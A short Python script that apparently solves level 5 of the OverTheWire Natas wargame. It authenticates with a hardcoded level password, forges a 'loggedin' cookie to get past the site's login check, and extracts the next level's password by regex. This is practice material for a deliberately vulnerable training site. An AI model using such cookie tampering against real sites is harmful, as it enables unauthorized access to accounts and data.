#!/usr/bin/env python3
import requests 
import re

username = "natas5"
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'

s = requests.session()
cookies = {'loggedin' : '1'}


url = 'http://%s.natas.labs.overthewire.org' % username


r = s.get(url, auth = (username, password), cookies=cookies)
content = r.text

# print(s.cookies)
# print(content)
print(re.findall('The password for natas6 is (.*)</div>',content)[0])